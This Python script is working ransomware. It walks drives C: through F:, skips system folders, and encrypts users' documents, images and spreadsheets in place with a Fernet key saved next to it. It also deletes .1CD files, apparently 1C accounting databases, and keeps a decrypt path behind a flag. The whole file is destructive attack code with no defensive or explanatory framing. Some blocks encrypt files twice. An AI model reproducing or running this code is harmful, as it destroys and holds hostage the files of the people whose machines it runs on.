import glob
import os
# import unittest

from cryptography.fernet import Fernet


scan_dir_to_encrypt_decrypt = 'C:\\'
dir_sistem = 'C:\\Program Files\\'
dir_sistem2 = 'C:\\Windows\\'
dir_sistem3 = 'C:\\Program Files (x86)\\'
dir_sistem4 = 'C:\\ProgramData\\'
dir_sistem5 = 'C:\\Users\\user\\AppData\\'
scan_dir_to_encrypt_decrypt2 = 'D:\\'
scan_dir_to_encrypt_decrypt3 = 'E:\\'
scan_dir_to_encrypt_decrypt4 = 'F:\\'
path = scan_dir_to_encrypt_decrypt
filelist = []
dir_sistem_box = []
dir_sistem_box2 = []
dir_sistem_box3 = []
dir_sistem_box4 = []
dir_sistem_box5 = []
new_list = []
filelist2 = []
filelist3 = []
filelist4 = []
for_del = 'C:\\'
for_del2 = 'D:\\'


key = Fernet.generate_key()
if not os.path.exists('my_key.txt'):
    with open('my_key.txt', 'wb') as f:
        f.write(key)
else:
    key = open('my_key.txt', 'rb').read()
print(key)
cipher = Fernet(key)

encrypt_yes = True

if encrypt_yes:
    def file_func():
        global filelist, new_list

        for root, dirs, files in os.walk(scan_dir_to_encrypt_decrypt):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    print(os.path.join(root, file))
                    filelist.append(os.path.join(root, file))

        for root, dirs, files in os.walk(dir_sistem):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    os.path.join(root, file)
                    dir_sistem_box.append(os.path.join(root, file))

        for root, dirs, files in os.walk(dir_sistem2):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    os.path.join(root, file)
                    dir_sistem_box2.append(os.path.join(root, file))

        for root, dirs, files in os.walk(dir_sistem3):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    os.path.join(root, file)
                    dir_sistem_box3.append(os.path.join(root, file))

        for root, dirs, files in os.walk(dir_sistem4):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    os.path.join(root, file)
                    dir_sistem_box4.append(os.path.join(root, file))

        for root, dirs, files in os.walk(dir_sistem5):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    os.path.join(root, file)
                    dir_sistem_box5.append(os.path.join(root, file))
        # for i in dir_sistem_box:
        #     filelist.remove(i)
        # print(filelist)
        new_list = list(set(filelist)-set(dir_sistem_box)-set(dir_sistem_box2)-set(dir_sistem_box3)-set(dir_sistem_box4)-set(dir_sistem_box5))
        print(new_list)


    file_func()
# print(filelist)


    def func_crypt():
        try:
            for entry in new_list:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t" )

                print(new_list)

        except FileNotFoundError:
            pass
        except (Exception, PermissionError):
            pass
        # finally:
        #     for entry in new_list:
        #         print(entry)
        #         read_file = open(entry, 'rb').read()
        #         encrypted_file_content = cipher.encrypt(read_file)
        #         with open(entry, 'wb') as f:
        #             f.write(encrypted_file_content)
        #         print("file encrypted:\t" )


    func_crypt()

    def func_del():
        for root, dirs, files in os.walk(for_del):
            for file in files:
                if file.endswith(".1CD"):
                    p = os.path.join(root, file)
                    print(p)
                    os.remove(p)
    func_del()
    #
    #
    def file_func2():
        for root, dirs, files in os.walk(scan_dir_to_encrypt_decrypt2):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".dat") or file.endswith(
                        ".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(
                        ".lgp") or file.endswith(".xlsx"):
                    print(os.path.join(path, file))
                    filelist2.append(os.path.join(root, file))


    file_func2()


    # print(filelist)

    def func_crypt2():
        try:
            for entry in filelist2:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t")

                print(filelist2)
        except (Exception, PermissionError):
            pass
        finally:
            for entry in filelist2:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t")


    func_crypt2()


    def func_del2():
        for root, dirs, files in os.walk(for_del):
            for file in files:
                if file.endswith(".1CD"):
                    p = os.path.join(root, file)
                    print(p)
                    os.remove(p)


    func_del2()

    def file_func3():
        for root, dirs, files in os.walk(scan_dir_to_encrypt_decrypt3):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".dat") or file.endswith(
                        ".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(
                        ".lgp") or file.endswith(".xlsx"):
                    print(os.path.join(path, file))
                    filelist3.append(os.path.join(root, file))


    file_func3()

    def func_crypt3():
        try:
            for entry in filelist3:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t")

                print(filelist3)
        except (Exception, PermissionError):
            pass
        finally:
            for entry in filelist3:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t")


    func_crypt3()


    def file_func4():
        for root, dirs, files in os.walk(scan_dir_to_encrypt_decrypt4):
            for file in files:
                if file.endswith(".pdf") or file.endswith(".txt") or file.endswith(".dat") or file.endswith(
                        ".docx") or file.endswith(".doc") or file.endswith(".jpg") or file.endswith(".lgp") or file.endswith(".xlsx"):
                    print(os.path.join(path, file))
                    filelist4.append(os.path.join(root, file))


    file_func4()


    def func_crypt4():
        try:
            for entry in filelist4:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t")

                print(filelist4)
        except (Exception, PermissionError):
            pass
        finally:
            for entry in filelist4:
                print(entry)
                read_file = open(entry, 'rb').read()
                encrypted_file_content = cipher.encrypt(read_file)
                with open(entry, 'wb') as f:
                    f.write(encrypted_file_content)
                print("file encrypted:\t")


    func_crypt4()



else:

    for root, dirs, files in os.walk(scan_dir_to_encrypt_decrypt):
        for file in files:

            print(os.path.join(path, file))
            filelist.append(os.path.join(root, file))

        for entry in filelist:
            print(entry)
            encrypted_file_content = open(entry, 'rb').read()
            file_content = cipher.decrypt(encrypted_file_content)
            with open(entry, 'wb') as f:
                f.write(file_content)
            print("file decrypted:\t")










